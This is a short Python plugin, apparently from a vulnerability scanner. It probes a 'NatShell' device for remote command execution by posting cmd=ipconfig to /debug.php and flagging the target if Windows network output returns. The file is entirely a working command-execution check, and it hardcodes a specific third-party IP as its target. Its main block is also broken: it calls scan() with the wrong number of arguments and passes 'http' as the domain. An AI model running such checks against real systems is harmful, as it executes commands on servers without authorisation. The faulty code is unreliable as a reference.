# -*- coding:utf-8 -*-

import sys;sys.path.append("../")

import requests
from lib.io import MyPrint


def scan(domain, ip, port):
    leakName = "natshell_remote_rce"

    url = domain + "/debug.php"

    data1 = {
        'cmd': 'ipconfig'
    }
    data2 = {
        'cmd': 'ifconfig'
    }

    try:
        r = requests.post(url, data=data1, timeout=3)

    except Exception as e:
        MyPrint(-1, leakName)
    else:

        if r.status_code == 200 and "Windows IP" in r.text:
            MyPrint(1, leakName)
        else:
            MyPrint(0, leakName)



if __name__ == "__main__":

    scan("http", "182.122.150.128", "182.122.150.128", "7788")       # 网络异常
